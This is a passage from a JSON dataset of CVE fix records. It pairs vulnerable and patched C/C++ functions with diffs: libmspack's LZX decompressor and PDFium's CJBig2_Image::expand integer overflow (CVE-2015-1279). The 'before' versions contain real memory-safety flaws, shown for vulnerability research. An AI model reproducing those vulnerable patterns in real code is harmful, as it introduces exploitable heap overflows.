*runsrc++;\n\t\trunsrc = window;\n\t      }\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\t    else {\n\t      runsrc = rundest - match_offset;\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\n\t    this_run    -= match_length;\n\t    window_posn += match_length;\n\t  }\n\t} /* while (this_run > 0) */\n\tbreak;\n\n      case LZX_BLOCKTYPE_UNCOMPRESSED:\n\t/* as this_run is limited not to wrap a frame, this also means it\n\t * won't wrap the window (as the window is a multiple of 32k) */\n\trundest = &window[window_posn];\n\twindow_posn += this_run;\n\twhile (this_run > 0) {\n\t  if ((i = i_end - i_ptr) == 0) {\n\t    READ_IF_NEEDED;\n\t  }\n\t  else {\n\t    if (i > this_run) i = this_run;\n\t    lzx->sys->copy(i_ptr, rundest, (size_t) i);\n\t    rundest  += i;\n\t    i_ptr    += i;\n\t    this_run -= i;\n\t  }\n\t}\n\tbreak;\n\n      default:\n\treturn lzx->error = MSPACK_ERR_DECRUNCH; /* might as well */\n      }\n\n      /* did the final match overrun our desired this_run length? */\n      if (this_run < 0) {\n\tif ((unsigned int)(-this_run) > lzx->block_remaining) {\n\t  D((\"overrun went past end of block by %d (%d remaining)\",\n\t     -this_run, lzx->block_remaining ))\n\t  return lzx->error = MSPACK_ERR_DECRUNCH;\n\t}\n\tlzx->block_remaining -= -this_run;\n      }\n    } /* while (bytes_todo > 0) */\n\n    /* streams don't extend over frame boundaries */\n    if ((window_posn - lzx->frame_posn) != frame_size) {\n      D((\"decode beyond output frame limits! %d != %d\",\n\t window_posn - lzx->frame_posn, frame_size))\n      return lzx->error = MSPACK_ERR_DECRUNCH;\n    }\n\n    /* re-align input bitstream */\n    if (bits_left > 0) ENSURE_BITS(16);\n    if (bits_left & 15) REMOVE_BITS(bits_left & 15);\n\n    /* check that we've used all of the previous frame first */\n    if (lzx->o_ptr != lzx->o_end) {\n      D((\"%ld avail bytes, new %d frame\",\n          (long)(lzx->o_end - lzx->o_ptr), frame_size))\n      return lzx->error = MSPACK_ERR_DECRUNCH;\n    }\n\n    /* does this intel block _really_ need decoding? */\n    if (lzx->intel_started && lzx->intel_filesize &&\n\t(lzx->frame <= 32768) && (frame_size > 10))\n    {\n      unsigned char *data    = &lzx->e8_buf[0];\n      unsigned char *dataend = &lzx->e8_buf[frame_size - 10];\n      signed int curpos      = lzx->intel_curpos;\n      signed int filesize    = lzx->intel_filesize;\n      signed int abs_off, rel_off;\n\n      /* copy e8 block to the e8 buffer and tweak if needed */\n      lzx->o_ptr = data;\n      lzx->sys->copy(&lzx->window[lzx->frame_posn], data, frame_size);\n\n      while (data < dataend) {\n\tif (*data++ != 0xE8) { curpos++; continue; }\n\tabs_off = data[0] | (data[1]<<8) | (data[2]<<16) | (data[3]<<24);\n\tif ((abs_off >= -curpos) && (abs_off < filesize)) {\n\t  rel_off = (abs_off >= 0) ? abs_off - curpos : abs_off + filesize;\n\t  data[0] = (unsigned char) rel_off;\n\t  data[1] = (unsigned char) (rel_off >> 8);\n\t  data[2] = (unsigned char) (rel_off >> 16);\n\t  data[3] = (unsigned char) (rel_off >> 24);\n\t}\n\tdata += 4;\n\tcurpos += 5;\n      }\n      lzx->intel_curpos += frame_size;\n    }\n    else {\n      lzx->o_ptr = &lzx->window[lzx->frame_posn];\n      if (lzx->intel_filesize) lzx->intel_curpos += frame_size;\n    }\n    lzx->o_end = &lzx->o_ptr[frame_size];\n\n    /* write a frame */\n    i = (out_bytes < (off_t)frame_size) ? (unsigned int)out_bytes : frame_size;\n    if (lzx->sys->write(lzx->output, lzx->o_ptr, i) != i) {\n      return lzx->error = MSPACK_ERR_WRITE;\n    }\n    lzx->o_ptr  += i;\n    lzx->offset += i;\n    out_bytes   -= i;\n\n    /* advance frame start position */\n    lzx->frame_posn += frame_size;\n    lzx->frame++;\n\n    /* wrap window / frame position pointers */\n    if (window_posn == lzx->window_size)     window_posn = 0;\n    if (lzx->frame_posn == lzx->window_size) lzx->frame_posn = 0;\n\n  } /* while (lzx->frame < end_frame) */\n\n  if (out_bytes) {\n    D((\"bytes left to output\"))\n    return lzx->error = MSPACK_ERR_DECRUNCH;\n  }\n\n  /* store local state */\n  STORE_BITS;\n  lzx->window_posn = window_posn;\n  lzx->R0 = R0;\n  lzx->R1 = R1;\n  lzx->R2 = R2;\n\n  return MSPACK_ERR_OK;\n}",
        "func": "int lzxd_decompress(struct lzxd_stream *lzx, off_t out_bytes) {\n  /* bitstream and huffman reading variables */\n  register unsigned int bit_buffer;\n  register int bits_left, i=0;\n  unsigned char *i_ptr, *i_end;\n  register unsigned short sym;\n\n  int match_length, length_footer, extra, verbatim_bits, bytes_todo;\n  int this_run, main_element, aligned_bits, j;\n  unsigned char *window, *runsrc, *rundest, buf[12];\n  unsigned int frame_size=0, end_frame, match_offset, window_posn;\n  unsigned int R0, R1, R2;\n\n  /* easy answers */\n  if (!lzx || (out_bytes < 0)) return MSPACK_ERR_ARGS;\n  if (lzx->error) return lzx->error;\n\n  /* flush out any stored-up bytes before we begin */\n  i = lzx->o_end - lzx->o_ptr;\n  if ((off_t) i > out_bytes) i = (int) out_bytes;\n  if (i) {\n    if (lzx->sys->write(lzx->output, lzx->o_ptr, i) != i) {\n      return lzx->error = MSPACK_ERR_WRITE;\n    }\n    lzx->o_ptr  += i;\n    lzx->offset += i;\n    out_bytes   -= i;\n  }\n  if (out_bytes == 0) return MSPACK_ERR_OK;\n\n  /* restore local state */\n  RESTORE_BITS;\n  window = lzx->window;\n  window_posn = lzx->window_posn;\n  R0 = lzx->R0;\n  R1 = lzx->R1;\n  R2 = lzx->R2;\n\n  end_frame = (unsigned int)((lzx->offset + out_bytes) / LZX_FRAME_SIZE) + 1;\n\n  while (lzx->frame < end_frame) {\n    /* have we reached the reset interval? (if there is one?) */\n    if (lzx->reset_interval && ((lzx->frame % lzx->reset_interval) == 0)) {\n      if (lzx->block_remaining) {\n\tD((\"%d bytes remaining at reset interval\", lzx->block_remaining))\n\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n      }\n\n      /* re-read the intel header and reset the huffman lengths */\n      lzxd_reset_state(lzx);\n      R0 = lzx->R0;\n      R1 = lzx->R1;\n      R2 = lzx->R2;\n    }\n\n    /* LZX DELTA format has chunk_size, not present in LZX format */\n    if (lzx->is_delta) {\n      ENSURE_BITS(16);\n      REMOVE_BITS(16);\n    }\n\n    /* read header if necessary */\n    if (!lzx->header_read) {\n      /* read 1 bit. if bit=0, intel filesize = 0.\n       * if bit=1, read intel filesize (32 bits) */\n      j = 0; READ_BITS(i, 1); if (i) { READ_BITS(i, 16); READ_BITS(j, 16); }\n      lzx->intel_filesize = (i << 16) | j;\n      lzx->header_read = 1;\n    } \n\n    /* calculate size of frame: all frames are 32k except the final frame\n     * which is 32kb or less. this can only be calculated when lzx->length\n     * has been filled in. */\n    frame_size = LZX_FRAME_SIZE;\n    if (lzx->length && (lzx->length - lzx->offset) < (off_t)frame_size) {\n      frame_size = lzx->length - lzx->offset;\n    }\n\n    /* decode until one more frame is available */\n    bytes_todo = lzx->frame_posn + frame_size - window_posn;\n    while (bytes_todo > 0) {\n      /* initialise new block, if one is needed */\n      if (lzx->block_remaining == 0) {\n\t/* realign if previous block was an odd-sized UNCOMPRESSED block */\n\tif ((lzx->block_type == LZX_BLOCKTYPE_UNCOMPRESSED) &&\n\t    (lzx->block_length & 1))\n\t{\n\t  READ_IF_NEEDED;\n\t  i_ptr++;\n\t}\n\n\t/* read block type (3 bits) and block length (24 bits) */\n\tREAD_BITS(lzx->block_type, 3);\n\tREAD_BITS(i, 16); READ_BITS(j, 8);\n\tlzx->block_remaining = lzx->block_length = (i << 8) | j;\n\t/*D((\"new block t%d len %u\", lzx->block_type, lzx->block_length))*/\n\n\t/* read individual block headers */\n\tswitch (lzx->block_type) {\n\tcase LZX_BLOCKTYPE_ALIGNED:\n\t  /* read lengths of and build aligned huffman decoding tree */\n\t  for (i = 0; i < 8; i++) { READ_BITS(j, 3); lzx->ALIGNED_len[i] = j; }\n\t  BUILD_TABLE(ALIGNED);\n\t  /* no break -- rest of aligned header is same as verbatim */\n\tcase LZX_BLOCKTYPE_VERBATIM:\n\t  /* read lengths of and build main huffman decoding tree */\n\t  READ_LENGTHS(MAINTREE, 0, 256);\n\t  READ_LENGTHS(MAINTREE, 256, LZX_NUM_CHARS + lzx->num_offsets);\n\t  BUILD_TABLE(MAINTREE);\n\t  /* if the literal 0xE8 is anywhere in the block... */\n\t  if (lzx->MAINTREE_len[0xE8] != 0) lzx->intel_started = 1;\n\t  /* read lengths of and build lengths huffman decoding tree */\n\t  READ_LENGTHS(LENGTH, 0, LZX_NUM_SECONDARY_LENGTHS);\n\t  BUILD_TABLE_MAYBE_EMPTY(LENGTH);\n\t  break;\n\n\tcase LZX_BLOCKTYPE_UNCOMPRESSED:\n\t  /* because we can't assume otherwise */\n\t  lzx->intel_started = 1;\n\n\t  /* read 1-16 (not 0-15) bits to align to bytes */\n\t  if (bits_left == 0) ENSURE_BITS(16);\n\t  bits_left = 0; bit_buffer = 0;\n\n\t  /* read 12 bytes of stored R0 / R1 / R2 values */\n\t  for (rundest = &buf[0], i = 0; i < 12; i++) {\n\t    READ_IF_NEEDED;\n\t    *rundest++ = *i_ptr++;\n\t  }\n\t  R0 = buf[0] | (buf[1] << 8) | (buf[2]  << 16) | (buf[3]  << 24);\n\t  R1 = buf[4] | (buf[5] << 8) | (buf[6]  << 16) | (buf[7]  << 24);\n\t  R2 = buf[8] | (buf[9] << 8) | (buf[10] << 16) | (buf[11] << 24);\n\t  break;\n\n\tdefault:\n\t  D((\"bad block type\"))\n\t  return lzx->error = MSPACK_ERR_DECRUNCH;\n\t}\n      }\n\n      /* decode more of the block:\n       * run = min(what's available, what's needed) */\n      this_run = lzx->block_remaining;\n      if (this_run > bytes_todo) this_run = bytes_todo;\n\n      /* assume we decode exactly this_run bytes, for now */\n      bytes_todo           -= this_run;\n      lzx->block_remaining -= this_run;\n\n      /* decode at least this_run bytes */\n      switch (lzx->block_type) {\n      case LZX_BLOCKTYPE_VERBATIM:\n\twhile (this_run > 0) {\n\t  READ_HUFFSYM(MAINTREE, main_element);\n\t  if (main_element < LZX_NUM_CHARS) {\n\t    /* literal: 0 to LZX_NUM_CHARS-1 */\n\t    window[window_posn++] = main_element;\n\t    this_run--;\n\t  }\n\t  else {\n\t    /* match: LZX_NUM_CHARS + ((slot<<3) | length_header (3 bits)) */\n\t    main_element -= LZX_NUM_CHARS;\n\n\t    /* get match length */\n\t    match_length = main_element & LZX_NUM_PRIMARY_LENGTHS;\n\t    if (match_length == LZX_NUM_PRIMARY_LENGTHS) {\n\t      if (lzx->LENGTH_empty) {\n                D((\"LENGTH symbol needed but tree is empty\"))\n                return lzx->error = MSPACK_ERR_DECRUNCH;\n              }\n\t      READ_HUFFSYM(LENGTH, length_footer);\n\t      match_length += length_footer;\n\t    }\n\t    match_length += LZX_MIN_MATCH;\n\n\t    /* get match offset */\n\t    switch ((match_offset = (main_element >> 3))) {\n\t    case 0: match_offset = R0;                                  break;\n\t    case 1: match_offset = R1; R1=R0;        R0 = match_offset; break;\n\t    case 2: match_offset = R2; R2=R0;        R0 = match_offset; break;\n\t    case 3: match_offset = 1;  R2=R1; R1=R0; R0 = match_offset; break;\n\t    default:\n\t      extra = (match_offset >= 36) ? 17 : extra_bits[match_offset];\n\t      READ_BITS(verbatim_bits, extra);\n\t      match_offset = position_base[match_offset] - 2 + verbatim_bits;\n\t      R2 = R1; R1 = R0; R0 = match_offset;\n\t    }\n\n\t    /* LZX DELTA uses max match length to signal even longer match */\n\t    if (match_length == LZX_MAX_MATCH && lzx->is_delta) {\n\t\tint extra_len = 0;\n\t\tENSURE_BITS(3); /* 4 entry huffman tree */\n\t\tif (PEEK_BITS(1) == 0) {\n\t\t    REMOVE_BITS(1); /* '0' -> 8 extra length bits */\n\t\t    READ_BITS(extra_len, 8);\n\t\t}\n\t\telse if (PEEK_BITS(2) == 2) {\n\t\t    REMOVE_BITS(2); /* '10' -> 10 extra length bits + 0x100 */\n\t\t    READ_BITS(extra_len, 10);\n\t\t    extra_len += 0x100;\n\t\t}\n\t\telse if (PEEK_BITS(3) == 6) {\n\t\t    REMOVE_BITS(3); /* '110' -> 12 extra length bits + 0x500 */\n\t\t    READ_BITS(extra_len, 12);\n\t\t    extra_len += 0x500;\n\t\t}\n\t\telse {\n\t\t    REMOVE_BITS(3); /* '111' -> 15 extra length bits */\n\t\t    READ_BITS(extra_len, 15);\n\t\t}\n\t\tmatch_length += extra_len;\n\t    }\n\n\t    if ((window_posn + match_length) > lzx->window_size) {\n\t      D((\"match ran over window wrap\"))\n\t      return lzx->error = MSPACK_ERR_DECRUNCH;\n\t    }\n\t    \n\t    /* copy match */\n\t    rundest = &window[window_posn];\n\t    i = match_length;\n\t    /* does match offset wrap the window? */\n\t    if (match_offset > window_posn) {\n\t      if (match_offset > lzx->offset &&\n\t\t  (match_offset - window_posn) > lzx->ref_data_size)\n\t      {\n\t\tD((\"match offset beyond LZX stream\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      /* j = length from match offset to end of window */\n\t      j = match_offset - window_posn;\n\t      if (j > (int) lzx->window_size) {\n\t\tD((\"match offset beyond window boundaries\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      runsrc = &window[lzx->window_size - j];\n\t      if (j < i) {\n\t\t/* if match goes over the window edge, do two copy runs */\n\t\ti -= j; while (j-- > 0) *rundest++ = *runsrc++;\n\t\trunsrc = window;\n\t      }\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\t    else {\n\t      runsrc = rundest - match_offset;\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\n\t    this_run    -= match_length;\n\t    window_posn += match_length;\n\t  }\n\t} /* while (this_run > 0) */\n\tbreak;\n\n      case LZX_BLOCKTYPE_ALIGNED:\n\twhile (this_run > 0) {\n\t  READ_HUFFSYM(MAINTREE, main_element);\n\t  if (main_element < LZX_NUM_CHARS) {\n\t    /* literal: 0 to LZX_NUM_CHARS-1 */\n\t    window[window_posn++] = main_element;\n\t    this_run--;\n\t  }\n\t  else {\n\t    /* match: LZX_NUM_CHARS + ((slot<<3) | length_header (3 bits)) */\n\t    main_element -= LZX_NUM_CHARS;\n\n\t    /* get match length */\n\t    match_length = main_element & LZX_NUM_PRIMARY_LENGTHS;\n\t    if (match_length == LZX_NUM_PRIMARY_LENGTHS) {\n              if (lzx->LENGTH_empty) {\n                D((\"LENGTH symbol needed but tree is empty\"))\n                return lzx->error = MSPACK_ERR_DECRUNCH;\n              } \n\t      READ_HUFFSYM(LENGTH, length_footer);\n\t      match_length += length_footer;\n\t    }\n\t    match_length += LZX_MIN_MATCH;\n\n\t    /* get match offset */\n\t    switch ((match_offset = (main_element >> 3))) {\n\t    case 0: match_offset = R0;                             break;\n\t    case 1: match_offset = R1; R1 = R0; R0 = match_offset; break;\n\t    case 2: match_offset = R2; R2 = R0; R0 = match_offset; break;\n\t    default:\n\t      extra = (match_offset >= 36) ? 17 : extra_bits[match_offset];\n\t      match_offset = position_base[match_offset] - 2;\n\t      if (extra > 3) {\n\t\t/* verbatim and aligned bits */\n\t\textra -= 3;\n\t\tREAD_BITS(verbatim_bits, extra);\n\t\tmatch_offset += (verbatim_bits << 3);\n\t\tREAD_HUFFSYM(ALIGNED, aligned_bits);\n\t\tmatch_offset += aligned_bits;\n\t      }\n\t      else if (extra == 3) {\n\t\t/* aligned bits only */\n\t\tREAD_HUFFSYM(ALIGNED, aligned_bits);\n\t\tmatch_offset += aligned_bits;\n\t      }\n\t      else if (extra > 0) { /* extra==1, extra==2 */\n\t\t/* verbatim bits only */\n\t\tREAD_BITS(verbatim_bits, extra);\n\t\tmatch_offset += verbatim_bits;\n\t      }\n\t      else /* extra == 0 */ {\n\t\t/* ??? not defined in LZX specification! */\n\t\tmatch_offset = 1;\n\t      }\n\t      /* update repeated offset LRU queue */\n\t      R2 = R1; R1 = R0; R0 = match_offset;\n\t    }\n\n\t    /* LZX DELTA uses max match length to signal even longer match */\n\t    if (match_length == LZX_MAX_MATCH && lzx->is_delta) {\n\t\tint extra_len = 0;\n\t\tENSURE_BITS(3); /* 4 entry huffman tree */\n\t\tif (PEEK_BITS(1) == 0) {\n\t\t    REMOVE_BITS(1); /* '0' -> 8 extra length bits */\n\t\t    READ_BITS(extra_len, 8);\n\t\t}\n\t\telse if (PEEK_BITS(2) == 2) {\n\t\t    REMOVE_BITS(2); /* '10' -> 10 extra length bits + 0x100 */\n\t\t    READ_BITS(extra_len, 10);\n\t\t    extra_len += 0x100;\n\t\t}\n\t\telse if (PEEK_BITS(3) == 6) {\n\t\t    REMOVE_BITS(3); /* '110' -> 12 extra length bits + 0x500 */\n\t\t    READ_BITS(extra_len, 12);\n\t\t    extra_len += 0x500;\n\t\t}\n\t\telse {\n\t\t    REMOVE_BITS(3); /* '111' -> 15 extra length bits */\n\t\t    READ_BITS(extra_len, 15);\n\t\t}\n\t\tmatch_length += extra_len;\n\t    }\n\n\t    if ((window_posn + match_length) > lzx->window_size) {\n\t      D((\"match ran over window wrap\"))\n\t      return lzx->error = MSPACK_ERR_DECRUNCH;\n\t    }\n\n\t    /* copy match */\n\t    rundest = &window[window_posn];\n\t    i = match_length;\n\t    /* does match offset wrap the window? */\n\t    if (match_offset > window_posn) {\n\t      if (match_offset > lzx->offset &&\n\t\t  (match_offset - window_posn) > lzx->ref_data_size)\n\t      {\n\t\tD((\"match offset beyond LZX stream\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      /* j = length from match offset to end of window */\n\t      j = match_offset - window_posn;\n\t      if (j > (int) lzx->window_size) {\n\t\tD((\"match offset beyond window boundaries\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      runsrc = &window[lzx->window_size - j];\n\t      if (j < i) {\n\t\t/* if match goes over the window edge, do two copy runs */\n\t\ti -= j; while (j-- > 0) *rundest++ = *runsrc++;\n\t\trunsrc = window;\n\t      }\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\t    else {\n\t      runsrc = rundest - match_offset;\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\n\t    this_run    -= match_length;\n\t    window_posn += match_length;\n\t  }\n\t} /* while (this_run > 0) */\n\tbreak;\n\n      case LZX_BLOCKTYPE_UNCOMPRESSED:\n\t/* as this_run is limited not to wrap a frame, this also means it\n\t * won't wrap the window (as the window is a multiple of 32k) */\n\trundest = &window[window_posn];\n\twindow_posn += this_run;\n\twhile (this_run > 0) {\n\t  if ((i = i_end - i_ptr) == 0) {\n\t    READ_IF_NEEDED;\n\t  }\n\t  else {\n\t    if (i > this_run) i = this_run;\n\t    lzx->sys->copy(i_ptr, rundest, (size_t) i);\n\t    rundest  += i;\n\t    i_ptr    += i;\n\t    this_run -= i;\n\t  }\n\t}\n\tbreak;\n\n      default:\n\treturn lzx->error = MSPACK_ERR_DECRUNCH; /* might as well */\n      }\n\n      /* did the final match overrun our desired this_run length? */\n      if (this_run < 0) {\n\tif ((unsigned int)(-this_run) > lzx->block_remaining) {\n\t  D((\"overrun went past end of block by %d (%d remaining)\",\n\t     -this_run, lzx->block_remaining ))\n\t  return lzx->error = MSPACK_ERR_DECRUNCH;\n\t}\n\tlzx->block_remaining -= -this_run;\n      }\n    } /* while (bytes_todo > 0) */\n\n    /* streams don't extend over frame boundaries */\n    if ((window_posn - lzx->frame_posn) != frame_size) {\n      D((\"decode beyond output frame limits! %d != %d\",\n\t window_posn - lzx->frame_posn, frame_size))\n      return lzx->error = MSPACK_ERR_DECRUNCH;\n    }\n\n    /* re-align input bitstream */\n    if (bits_left > 0) ENSURE_BITS(16);\n    if (bits_left & 15) REMOVE_BITS(bits_left & 15);\n\n    /* check that we've used all of the previous frame first */\n    if (lzx->o_ptr != lzx->o_end) {\n      D((\"%ld avail bytes, new %d frame\",\n          (long)(lzx->o_end - lzx->o_ptr), frame_size))\n      return lzx->error = MSPACK_ERR_DECRUNCH;\n    }\n\n    /* does this intel block _really_ need decoding? */\n    if (lzx->intel_started && lzx->intel_filesize &&\n\t(lzx->frame <= 32768) && (frame_size > 10))\n    {\n      unsigned char *data    = &lzx->e8_buf[0];\n      unsigned char *dataend = &lzx->e8_buf[frame_size - 10];\n      signed int curpos      = lzx->intel_curpos;\n      signed int filesize    = lzx->intel_filesize;\n      signed int abs_off, rel_off;\n\n      /* copy e8 block to the e8 buffer and tweak if needed */\n      lzx->o_ptr = data;\n      lzx->sys->copy(&lzx->window[lzx->frame_posn], data, frame_size);\n\n      while (data < dataend) {\n\tif (*data++ != 0xE8) { curpos++; continue; }\n\tabs_off = data[0] | (data[1]<<8) | (data[2]<<16) | (data[3]<<24);\n\tif ((abs_off >= -curpos) && (abs_off < filesize)) {\n\t  rel_off = (abs_off >= 0) ? abs_off - curpos : abs_off + filesize;\n\t  data[0] = (unsigned char) rel_off;\n\t  data[1] = (unsigned char) (rel_off >> 8);\n\t  data[2] = (unsigned char) (rel_off >> 16);\n\t  data[3] = (unsigned char) (rel_off >> 24);\n\t}\n\tdata += 4;\n\tcurpos += 5;\n      }\n      lzx->intel_curpos += frame_size;\n    }\n    else {\n      lzx->o_ptr = &lzx->window[lzx->frame_posn];\n      if (lzx->intel_filesize) lzx->intel_curpos += frame_size;\n    }\n    lzx->o_end = &lzx->o_ptr[frame_size];\n\n    /* write a frame */\n    i = (out_bytes < (off_t)frame_size) ? (unsigned int)out_bytes : frame_size;\n    if (lzx->sys->write(lzx->output, lzx->o_ptr, i) != i) {\n      return lzx->error = MSPACK_ERR_WRITE;\n    }\n    lzx->o_ptr  += i;\n    lzx->offset += i;\n    out_bytes   -= i;\n\n    /* advance frame start position */\n    lzx->frame_posn += frame_size;\n    lzx->frame++;\n\n    /* wrap window / frame position pointers */\n    if (window_posn == lzx->window_size)     window_posn = 0;\n    if (lzx->frame_posn == lzx->window_size) lzx->frame_posn = 0;\n\n  } /* while (lzx->frame < end_frame) */\n\n  if (out_bytes) {\n    D((\"bytes left to output\"))\n    return lzx->error = MSPACK_ERR_DECRUNCH;\n  }\n\n  /* store local state */\n  STORE_BITS;\n  lzx->window_posn = window_posn;\n  lzx->R0 = R0;\n  lzx->R1 = R1;\n  lzx->R2 = R2;\n\n  return MSPACK_ERR_OK;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -119,8 +119,7 @@\n \t  lzx->intel_started = 1;\n \n \t  /* read 1-16 (not 0-15) bits to align to bytes */\n-\t  ENSURE_BITS(16);\n-\t  if (bits_left > 16) i_ptr -= 2;\n+\t  if (bits_left == 0) ENSURE_BITS(16);\n \t  bits_left = 0; bit_buffer = 0;\n \n \t  /* read 12 bytes of stored R0 / R1 / R2 values */",
        "diff_line_info": {
            "deleted_lines": [
                "\t  ENSURE_BITS(16);",
                "\t  if (bits_left > 16) i_ptr -= 2;"
            ],
            "added_lines": [
                "\t  if (bits_left == 0) ENSURE_BITS(16);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-1279",
        "func_name": "pdfium/CJBig2_Image::expand",
        "description": "Integer overflow in the CJBig2_Image::expand function in fxcodec/jbig2/JBig2_Image.cpp in PDFium, as used in Google Chrome before 44.0.2403.89, allows remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via large height and stride values.",
        "git_url": "https://pdfium.googlesource.com/pdfium/+/12d0f7b4eae9c2b40433500b15955f61050132aa",
        "commit_title": "Merge to M44: Integer overflow in CJBig2_Image::expand",
        "commit_text": " 1. New size should be larger than old size in JBig2_Realloc. 2. Arguments are integers but parameters are size_t in JBIG2_memset.    After integer overflows, it will be presented as a huge    unsigned number on 64 bits system.    (cherry picked from commit e9ccc9bc449846107f1c539e25677f4877ddf22f)  ",
        "func_before": "void CJBig2_Image::expand(FX_INT32 h, FX_BOOL v)\n{\n    if (!m_pData) {\n        return;\n    }\n    FX_SAFE_DWORD safeMemSize = pdfium::base::checked_cast<FX_DWORD>(h); \n    safeMemSize *= pdfium::base::checked_cast<FX_DWORD>(m_nStride);\n    if (!safeMemSize.IsValid()) {\n        return;\n    }\n    m_pData = (FX_BYTE*)m_pModule->JBig2_Realloc(m_pData, safeMemSize.ValueOrDie());\n    if(h > m_nHeight) {\n        JBIG2_memset(m_pData + m_nHeight * m_nStride, v ? 0xff : 0, (h - m_nHeight)*m_nStride);\n    }\n    m_nHeight = h;\n}",
        "func": "void CJBig2_Image::expand(FX_INT32 h, FX_BOOL v)\n{\n    if (!m_pData || h <= m_nHeight) {\n        return;\n    }\n    FX_DWORD dwH = pdfium::base::checked_cast<FX_DWORD>(h);\n    FX_DWORD dwStride = pdfium::base::checked_cast<FX_DWORD>(m_nStride);\n    FX_DWORD dwHeight = pdfium::base::checked_cast<FX_DWORD>(m_nHeight);\n    FX_SAFE_DWORD safeMemSize = dwH; \n    safeMemSize *= dwStride;\n    if (!safeMemSize.IsValid()) {\n        return;\n    }\n    //The guaranteed reallocated memory is to be < 4GB (unsigned int). \n    m_pData = (FX_BYTE*)m_pModule->JBig2_Realloc(m_pData, safeMemSize.ValueOrDie());\n    //The result of dwHeight * dwStride doesn't overflow after the \n    //checking of safeMemSize.\n    //The same as the result of (dwH - dwHeight) * dwStride) because\n    //dwH - dwHeight is always less than dwH(h) which is checked in\n    //the calculation of dwH * dwStride. \n    JBIG2_memset(m_pData + dwHeight * dwStride, v ? 0xff : 0, (dwH - dwHeight) * dwStride);\n    m_nHeight = h;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,16 +1,23 @@\n void CJBig2_Image::expand(FX_INT32 h, FX_BOOL v)\n {\n-    if (!m_pData) {\n+    if (!m_pData || h <= m_nHeight) {\n         return;\n     }\n-    FX_SAFE_DWORD safeMemSize = pdfium::base::checked_cast<FX_DWORD>(h); \n-    safeMemSize *= pdfium::base::checked_cast<FX_DWORD>(m_nStride);\n+    FX_DWORD dwH = pdfium::base::checked_cast<FX_DWORD>(h);\n+    FX_DWORD dwStride = pdfium::base::checked_cast<FX_DWORD>(m_nStride);\n+    FX_DWORD dwHeight = pdfium::base::checked_cast<FX_DWORD>(m_nHeight);\n+    FX_SAFE_DWORD safeMemSize = dwH; \n+    safeMemSize *= dwStride;\n     if (!safeMemSize.IsValid()) {\n         return;\n     }\n+    //The guaranteed reallocated memory is to be < 4GB (unsigned int). \n     m_pData = (FX_BYTE*)m_pModule->JBig2_Realloc(m_pData, safeMemSize.ValueOrDie());\n-    if(h > m_nHeight) {\n-        JBIG2_memset(m_pData + m_nHeight * m_nStride, v ? 0xff : 0, (h - m_nHeight)*m_nStride);\n-    }\n+    //The result of dwHeight * dwStride doesn't overflow after the \n+    //checking of safeMemSize.\n+    //The same as the result of (dwH - dwHeight) * dwStride) because\n+    //dwH - dwHeight is always less than dwH(h) which is checked in\n+    //the calculation of dwH * dwStride. \n+    JBIG2_memset(m_pData + dwHeight * dwStride, v ? 0xff : 0, (dwH - dwHeight) * dwStride);\n     m_nHeight = h;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "    if (!m_pData) {",
                "    FX_SAFE_DWORD safeMemSize = pdfium::base::checked_cast<FX_DWORD>(h); ",
                "    safeMemSize *= pdfium::base::checked_cast<FX_DWORD>(m_nStride);",
                "    if(h > m_nHeight) {",
                "        JBIG2_memset(m_pData + m_nHeight * m_nStride, v ? 0xff : 0, (h - m_nHeight)*m_nStride);",
                "    }"
            ],
            "added_lines": [
                "    if (!m_pData || h <= m_nHeight) {",
                "    FX_DWORD dwH = pdfium::base::checked_cast<FX_DWORD>(h);",
                "    FX_DWORD dwStride = pdfium::base::checked_cast<FX_DWORD>(m_nStride);",
                "    FX_DWORD dwHeight = pdfium::base::checked_cast<FX_DWORD>(m_nHeight);",
                "    FX_SAFE_DWORD safeMemSize = dwH; ",
                "    safeMemSize *= dwStride;",
                "    //The guaranteed reallocated memory is to be < 4GB (unsigned int). ",
                "    //The result of dwHeight * dwStride doesn't overflow after the ",
                "    //checking of safeMemSize.",
                "    //The same as the result of (dwH - dwHeight) * dwStride) because",
                "    //dwH - dwHeight is always less than dwH(h) which is checked in",
                "    //the calculation of dwH * dwStride. ",
                "    JBIG2_memset(m_pData + dwHeight * dwStride, v ? 0xff : 0, (dwH - dwHeight) * dwStride);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-1279",
        "func_name": "pdfium/CJBig2_Image::expand",
        "description": "Integer overflow in the CJBig2_Image::expand function in fxcodec/jbig2/JBig2_Image.cpp in PDFium, as used in Google Chrome before 44.0.2403.89, allows remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via large height and stride values.",
        "git_url": "https://pdfium.googlesource.com/pdfium/+/ffd6dce453db7f2f3d636ee6cb0d91bd700e6dc9",
        "commit_title": "Merge to M44: Fix Heap Overflow in CJBig2_Image::expand",
        "commit_text": " Integer overflow in CJBig2_Image::expand. It causes the size of reallocated is not expected.    (cherry picked from commit 59f4b44d1fbb259967ea518e0bf5fa76b0cc9767)  ",
        "func_before": "void CJBig2_Image::expand(FX_INT32 h, FX_BOOL v)\n{\n    if (!m_pData) {\n        return;\n    }\n    m_pData = (FX_BYTE*)m_pModule->JBig2_Realloc(m_pData, h * m_nStride);\n    if(h > m_nHeight) {\n        JBIG2_memset(m_pData + m_nHeight * m_nStride, v ? 0xff : 0, (h - m_nHeight)*m_nStride);\n    }\n    m_nHeight = h;\n}",
